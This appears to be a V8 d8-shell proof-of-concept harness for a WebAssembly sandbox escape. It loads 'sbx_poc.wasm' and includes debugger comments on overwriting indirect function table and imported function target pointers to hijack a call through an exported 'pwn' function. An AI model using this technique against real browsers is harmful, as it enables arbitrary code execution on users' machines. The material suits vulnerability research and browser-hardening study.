function sep() {
    console.log("==============================================================================================================");
}

function dp(_object) {
    %DebugPrint(_object)
}

function dpp(_object) {
    %DebugPrintPtr(_object)
}

const tbl0Table = new WebAssembly.Table({
    initial: 5,
    element: "anyfunc"
});

const importObject = {
    env: {
        jstimes3: (n) => 3 * n,
    },
    env0: {
        jstimes4: (n) => 3 * n,
    },
    env1: {
        jstimes5: (n) => 3 * n,
    },
    env2: {
        jstimes6: (n) => 3 * n,
    }, 
    js0: { tbl0: tbl0Table },
};

var code = read("sbx_poc.wasm", "binary")
print(`[+] Code: ${new Uint8Array(code)}`)
var module = new WebAssembly.Module(code);
var instance = new WebAssembly.Instance(module, importObject);

print("[+] Simulate where...")

// instance -> indirect_function_tables ->  ... -> targets
// eq targets+0x0
// r @$t0 = 0000016a`0010bec8 ; eq @$t0 4141414141414141
// tbl0Table.set(0, instance.exports.pwn)

print("[+] Simulate what...")

// exported functions -> shared_info -> data -> index
// eq data+0x?? (depends on offset)
// instance -> imported_function_targets -> data-start 
// eq data-start+0x8
// tbl0Table.set(0, instance.exports.pwn)